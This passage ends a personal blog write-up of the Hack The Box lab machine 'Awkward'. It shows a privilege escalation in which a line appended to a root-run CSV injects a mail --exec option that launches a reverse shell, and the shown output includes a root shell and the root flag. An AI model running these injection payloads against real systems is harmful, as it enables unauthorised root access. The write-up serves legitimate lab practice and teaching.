</span></span><span class=line><span class=cl><span class=o>[</span>Unit<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>Description</span><span class=o>=</span>Notifies Christine when a new leave request is submitted
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>Service<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>User</span><span class=o>=</span>root
</span></span><span class=line><span class=cl><span class=nv>WorkingDirectory</span><span class=o>=</span>/root/scripts
</span></span><span class=line><span class=cl><span class=nv>ExecStart</span><span class=o>=</span>/bin/bash -c /root/scripts/notify.sh
</span></span><span class=line><span class=cl><span class=nv>Restart</span><span class=o>=</span>always
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>Install<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=nv>WantedBy</span><span class=o>=</span>multi-user.target
</span></span></code></pre></td></tr></table></div></div><p>If I echo a new leave request into the CSV with <code>echo "foo,my break, 02/02/2023,03/03/2023,Yes" >> leave_requests.csv</code>, we get:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>2023/02/05 18:56:04 CMD: <span class=nv>UID</span><span class=o>=</span><span class=m>0</span>    <span class=nv>PID</span><span class=o>=</span><span class=m>57141</span>  <span class=p>|</span> mail -s Leave Request: foo christine 
</span></span></code></pre></td></tr></table></div></div><p>We cannot read the script <code>/root/scripts/notify.sh</code> &ndash; but given we can write to <code>leave_requests.csv</code> directly, and no longer need to worry about filtering, I&rsquo;m assuming we need to command inject into the subject of the mail command to execute arbitrary code..</p><p>Looking at <a href=https://gtfobins.github.io/gtfobins/mail/ target=_blank rel="noopener noreffer">https://gtfobins.github.io/gtfobins/mail/</a> , the <code>--exec</code> flag will allow us to execute arbitrary code from within the <code>mail</code> command, which in my case will be another reverse shell.</p><p>Here&rsquo;s where I spammed different variations of trying to escape from the subject string (<code>mail -s "&lt;inject here>"</code>) and run <code>/dev/shm/test2.sh</code> - launching my reverse shell on port 3333:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@awkward:~/private$ <span class=nb>echo</span> <span class=s2>&#34;\&#34; --exec=&#39;\!/dev/shm/test2.sh&#39;&#34;</span> &gt;&gt; leave_requests.csv
</span></span><span class=line><span class=cl>www-data@awkward:~/private$ <span class=nb>echo</span> <span class=s2>&#34;\&#34; --exec=\&#34;\!/dev/shm/test2.sh\&#34;&#34;</span> &gt;&gt; leave_requests.csv
</span></span></code></pre></td></tr></table></div></div><p>Looking back at the netcat listener on my own machine, the second one worked:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3333</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>3333</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.48<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.185<span class=o>]</span> <span class=m>33704</span>
</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>874<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
</span></span><span class=line><span class=cl>bash: no job control in this shell
</span></span><span class=line><span class=cl>root@awkward:~/scripts# ls -la
</span></span><span class=line><span class=cl>total <span class=m>24</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root root <span class=m>4096</span> Oct  <span class=m>6</span> 01:35 .
</span></span><span class=line><span class=cl>drwx------ <span class=m>9</span> root root <span class=m>4096</span> Oct <span class=m>20</span> 23:02 ..
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root  <span class=m>145</span> Oct  <span class=m>5</span> 22:02 express.sh
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root  <span class=m>318</span> Sep <span class=m>15</span> 21:49 notify.sh
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root  <span class=m>414</span> Oct  <span class=m>3</span> 21:19 restore.sh
</span></span><span class=line><span class=cl>-rwxr-xr-x <span class=m>1</span> root root   <span class=m>82</span> Oct  <span class=m>5</span> 22:45 vue.sh
</span></span><span class=line><span class=cl>root@awkward:~/scripts# 
</span></span><span class=line><span class=cl>root@awkward:~/scripts# <span class=nb>cd</span> /root
</span></span><span class=line><span class=cl><span class=nb>cd</span> /root
</span></span><span class=line><span class=cl>root@awkward:~# ls     	
</span></span><span class=line><span class=cl>ls
</span></span><span class=line><span class=cl>backup
</span></span><span class=line><span class=cl>root.txt
</span></span><span class=line><span class=cl>scripts
</span></span><span class=line><span class=cl>snap
</span></span><span class=line><span class=cl>root@awkward:~# cat root.txt
</span></span><span class=line><span class=cl>cat root.txt
</span></span><span class=line><span class=cl>b56c5ced67d9d8941f016654a3e27364
</span></span></code></pre></td></tr></table></div></div><p>And we have the root flag finally!</p><h2 id=conclusion>Conclusion</h2><p>This one was quite time consuming and frustrating. I stumbled on the <code>awk</code> LFI and <code>sed</code> command injection. I have to remind myself when doing any kind of injection to always be mindful of the string I&rsquo;m passing, and if possible, aim for it to be syntactically valid once injected &ndash; otherwise the shelled out command may fail and we miss out on LFI or command injection.</p><p>It&rsquo;s easy to see something, get caught up in the excitement of it all and throw variations at it without carefully crafting a payload and considering whether or not commands are likely to error before we get what we need.</p><p>Brute forcing a weak JWT signing key was new to me, and the SSRF for the url param initially seemed obvious, but I was blocked for a little while before deciding to try fuzzing ports. Once again, I needed to remind myself to not just blindly enumerate and fuzz, but look at the broader context and story &ndash; which in this case, involved reminding myself that this was a development server running webpack dev server, and likely not deployed on production-like ports (80, 8080, etc).</p><p>I also spent way too much time trying to decompile the webpack bundle VueJS site (not shown in my notes above), hoping to get cleaner JavaScript for the purposes of finding available routes. After trying a few tools unsuccessfully, in the end I just parsed the file manually (not fun).</p><p>Overall a fun machine though, even if it involved a couple of days on and off with regular breaks to step away from the frustration of hitting a brick wall multiple times.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-02-25&nbsp;<a class=git-hash href=https://github.com/m-dwyer/emdwyer.github.io/commit/885f8f75beb46df4d1e366981a49cb5765517521 target=_blank title="commit by m-dwyer(13535330+m-dwyer@users.noreply.github.com) 885f8f75beb46df4d1e366981a49cb5765517521: Add Awkward HTB walkthrough">
<i class="fas fa-hashtag fa-fw" aria-hidden=true></i>885f8f7</a></span></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/2023-02-25-awkward-htb/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://emdwyer.github.io/2023-02-25-awkward-htb/><i class="fab fa-linkedin fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://emdwyer.github.io/2023-02-25-awkward-htb/ data-title="Awkward HTB Walkthrough"><i class="fab fa-hacker-news fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="Share on Line" data-sharer=line data-url=https://emdwyer.github.io/2023-02-25-awkward-htb/ data-title="Awkward HTB Walkthrough"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg aria-hidden=true></i></a><a href=javascript:void(0); title="Share on 微博" data-sharer=weibo data-url=https://emdwyer.github.io/2023-02-25-awkward-htb/ data-title="Awkward HTB Walkthrough"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/htb/>htb</a>,&nbsp;<a href=/tags/security/>security</a>,&nbsp;<a href=/tags/penetration-testing/>penetration testing</a>,&nbsp;<a href=/tags/ctf/>ctf</a>,&nbsp;<a href=/tags/vue/>vue</a>,&nbsp;<a href=/tags/php/>php</a>,&nbsp;<a href=/tags/node/>node</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/2023-02-11-photobomb/ class=prev rel=prev title="Photobomb HTB Walkthrough"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>Photobomb HTB Walkthrough</a></div></div><div id=comments><div id=valine class=comment></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://valine.js.org/>Valine</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2022 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>emdwyer</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><link rel=stylesheet href=/lib/valine/valine.min.css><script type=text/javascript src=https://cdn.jsdelivr.net/npm/valine@1.5.0/dist/Valine.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{valine:{appId:"QGzwQXOqs5JOhN4RGPOkR2mR-MdYXbMMI",appKey:"WBmoGyJtbqUswvfLh6L8iEBr",avatar:"mp",el:"#valine",emojiCDN:"https://cdn.jsdelivr.net/npm/emoji-datasource-google@14.0.0/img/google/64/",emojiMaps:{100:"1f4af.png",alien:"1f47d.png",anger:"1f4a2.png",angry:"1f620.png",anguished:"1f627.png",astonished:"1f632.png",black_heart:"1f5a4.png",blue_heart:"1f499.png",blush:"1f60a.png",bomb:"1f4a3.png",boom:"1f4a5.png",broken_heart:"1f494.png",brown_heart:"1f90e.png",clown_face:"1f921.png",cold_face:"1f976.png",cold_sweat:"1f630.png",confounded:"1f616.png",confused:"1f615.png",cry:"1f622.png",crying_cat_face:"1f63f.png",cupid:"1f498.png",dash:"1f4a8.png",disappointed:"1f61e.png",disappointed_relieved:"1f625.png",dizzy:"1f4ab.png",dizzy_face:"1f635.png",drooling_face:"1f924.png",exploding_head:"1f92f.png",expressionless:"1f611.png",face_vomiting:"1f92e.png",face_with_cowboy_hat:"1f920.png",face_with_hand_over_mouth:"1f92d.png",face_with_head_bandage:"1f915.png",face_with_monocle:"1f9d0.png",face_with_raised_eyebrow:"1f928.png",face_with_rolling_eyes:"1f644.png",face_with_symbols_on_mouth:"1f92c.png",face_with_thermometer:"1f912.png",fearful:"1f628.png",flushed:"1f633.png",frowning:"1f626.png",ghost:"1f47b.png",gift_heart:"1f49d.png",green_heart:"1f49a.png",grimacing:"1f62c.png",grin:"1f601.png",grinning:"1f600.png",hankey:"1f4a9.png",hear_no_evil:"1f649.png",heart:"2764-fe0f.png",heart_decoration:"1f49f.png",heart_eyes:"1f60d.png",heart_eyes_cat:"1f63b.png",heartbeat:"1f493.png",heartpulse:"1f497.png",heavy_heart_exclamation_mark_ornament:"2763-fe0f.png",hole:"1f573-fe0f.png",hot_face:"1f975.png",hugging_face:"1f917.png",hushed:"1f62f.png",imp:"1f47f.png",innocent:"1f607.png",japanese_goblin:"1f47a.png",japanese_ogre:"1f479.png",joy:"1f602.png",joy_cat:"1f639.png",kiss:"1f48b.png",kissing:"1f617.png",kissing_cat:"1f63d.png",kissing_closed_eyes:"1f61a.png",kissing_heart:"1f618.png",kissing_smiling_eyes:"1f619.png",laughing:"1f606.png",left_speech_bubble:"1f5e8-fe0f.png",love_letter:"1f48c.png",lying_face:"1f925.png",mask:"1f637.png",money_mouth_face:"1f911.png",nauseated_face:"1f922.png",nerd_face:"1f913.png",neutral_face:"1f610.png",no_mouth:"1f636.png",open_mouth:"1f62e.png",orange_heart:"1f9e1.png",partying_face:"1f973.png",pensive:"1f614.png",persevere:"1f623.png",pleading_face:"1f97a.png",pouting_cat:"1f63e.png",purple_heart:"1f49c.png",rage:"1f621.png",relaxed:"263a-fe0f.png",relieved:"1f60c.png",revolving_hearts:"1f49e.png",right_anger_bubble:"1f5ef-fe0f.png",robot_face:"1f916.png",rolling_on_the_floor_laughing:"1f923.png",scream:"1f631.png",scream_cat:"1f640.png",see_no_evil:"1f648.png",shushing_face:"1f92b.png",skull:"1f480.png",skull_and_crossbones:"2620-fe0f.png",sleeping:"1f634.png",sleepy:"1f62a.png",slightly_frowning_face:"1f641.png",slightly_smiling_face:"1f642.png",smile:"1f604.png",smile_cat:"1f638.png",smiley:"1f603.png",smiley_cat:"1f63a.png",smiling_face_with_3_hearts:"1f970.png",smiling_imp:"1f608.png",smirk:"1f60f.png",smirk_cat:"1f63c.png",sneezing_face:"1f927.png",sob:"1f62d.png",space_invader:"1f47e.png",sparkling_heart:"1f496.png",speak_no_evil:"1f64a.png",speech_balloon:"1f4ac.png","star-struck":"1f929.png",stuck_out_tongue:"1f61b.png",stuck_out_tongue_closed_eyes:"1f61d.png",stuck_out_tongue_winking_eye:"1f61c.png",sunglasses:"1f60e.png",sweat:"1f613.png",sweat_drops:"1f4a6.png",sweat_smile:"1f605.png",thinking_face:"1f914.png",thought_balloon:"1f4ad.png",tired_face:"1f62b.png",triumph:"1f624.png",two_hearts:"1f495.png",unamused:"1f612.png",upside_down_face:"1f643.png",weary:"1f629.png",white_frowning_face:"2639-fe0f.png",white_heart:"1f90d.png",wink:"1f609.png",woozy_face:"1f974.png",worried:"1f61f.png",yawning_face:"1f971.png",yellow_heart:"1f49b.png",yum:"1f60b.png",zany_face:"1f92a.png",zipper_mouth_face:"1f910.png",zzz:"1f4a4.png"},enableQQ:!1,highlight:!0,lang:"en",pageSize:10,placeholder:"Your comment ...",recordIP:!0,serverURLs:"https://leancloud.hugoloveit.com",visitor:!0}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>